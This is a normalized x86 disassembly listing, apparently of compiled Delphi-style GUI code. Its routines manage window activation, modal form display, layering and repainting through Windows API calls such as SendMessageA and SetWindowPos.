sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_457f18
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_454ae8
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_454ae8
jmp r-xdata
sub_456ae5
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45a544
call sub_4039a0
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_455838
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43e2b0
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_440d58
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456be0
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_440d58
call sub_45149c
mov ebx eax
sub_456c2c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_456c84
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc50
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456ce2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403198
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_456cf0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403394
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_456d1c
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45a530
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403394
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_456ebc
jmp r-xdata
mov eax ebx
call sub_456f58
mov dl 0x1
mov eax ebx
call sub_454aa8
jmp r-xdata
sub_456dc0
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_454434
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_454480
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_456e24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403638#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403394
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_456f58
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_456edc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_456f4a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456f51
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_455734
sub_456f74
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45723c
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_438dd0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_4594a4
xor edx edx
push ebp
push sub_45721f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_414114
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_45848c
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_45134c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4571fd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_456ec4
xor edx edx
push ebp
push sub_45715c
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_456e24
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45a2b0
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_440d58
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457163
mov eax [ ebp - 0x4 ]
call sub_456ebc
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_457163
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457207
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45848c
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_45848c
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_414090
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_4141dc
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_451400
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45724c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43da88
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45724c
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43da4c
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_4572bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45724c
pop ecx
mov eax [ esi + 0x34 ]
call sub_44c7a4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_44c7b4
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_457340
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f0a8
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403394
sub_457364
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403394
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_457394
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43da88
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_457364
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_457394
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43da4c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457410
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_457364
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_457364
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_457394
pop ecx
test al al
je r-xdata
sub_457464
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403394
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_457494
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43da88
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_457464
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_457494
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43da4c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457510
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_457464
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_457464
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_457494
pop ecx
test al al
je r-xdata
sub_457564
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_414098
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_446934
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4575b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_457564
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403394
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457634
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_41a1e0
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_457670
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_43aa54
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_43b724
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4576b8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_44105c
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_440d58
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_440d58
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_440d58
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_440d58
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_440d58
push eax
call RedrawWindow
sub_45780c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_4525bc
mov dl 0x5
mov eax ebx
call sub_454330
mov dl 0x1
mov eax ebx
call sub_43f934
mov dl 0x3
mov eax ebx
call sub_45462c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_457874
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45794b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43f7f4
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43f660
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_439a84
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a4e4
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_403fd8
mov eax [ ebp - 0xc ]
call sub_4041a8
push eax
mov eax [ ebp - 0xc ]
call sub_4043a8
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_43a4f4
mov eax [ ebp - 0xc ]
call sub_4041a8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457952
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
mov dl 0x1
mov eax esi
call sub_4539b0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_43a5a0
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_404534
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_457978
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_43da88
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_4530d4
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_43da4c
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403394
inc ebp
dec edi
jne r-xdata
sub_4579c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_43f7f4
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4579f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fffc
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_457a18
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_455d80
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_440d58
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_43f7f4
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_440d58
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_440d58
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43f808
or ecx 0xffffffff
mov dl 0x1
call sub_43ac18
pop esi
pop ebx
retn
sub_457ab0
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44046c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_43b724
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_439f10
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403394
sub_457b08
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_457bce
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43a4e4
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_403fd8
mov eax [ ebp - 0x4 ]
call sub_4041a8
push eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_43a4f4
mov eax [ ebp - 0x4 ]
call sub_4041a8
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43a5a0
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457bd5
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_4539b0
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_404534
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_457bf4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4401ec
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43f7f4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43f808
mov dl [ ebx + 0x57 ]
call sub_43a490
inc edi
dec esi
jne r-xdata
sub_457c98
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_457cc8
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_457cf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
